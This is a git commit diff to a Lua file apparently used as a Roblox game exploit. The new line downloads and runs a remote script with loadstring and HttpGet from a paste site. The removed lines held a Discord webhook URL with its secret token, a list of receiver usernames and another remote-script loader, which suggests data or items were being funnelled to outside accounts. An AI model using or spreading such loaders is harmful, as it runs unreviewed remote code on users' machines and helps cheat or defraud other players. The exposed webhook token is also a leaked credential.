2d1467a00ca35a2ec37f6d4f5be82f0f13f1c1b3
SynergyNetworkz <liuluvskuan@gmail.com>
2025-10-19 10:49:05 +0800

    Update PVBXPLOIT.lua

--- PVBXPLOIT.lua
+++ PVBXPLOIT.lua
@@ -1,6 +1,1 @@
-WEBHOOK = "https://discord.com/api/webhooks/1429059825085452300/hcgeht8B4mm5SjS_8fJo4Nb8bMkOGc3zySyG0I7cvgVFsUNxbSA3ZvYo-JwMN1acoXLd"
-RECEIVERS = {"shopkinsruby2457", "mikayyiSr", "ella_animate"}
-MONEY_PER_SECOND = 30
-DMG_PER_SECOND = 50
-
-loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/92a441756ee4871bfb812636767586801f0f78bf429972328477a1920bae6f15/download"))()
+loadstring(game:HttpGet("https://pastefy.app/x1f9tDyV/raw"))()
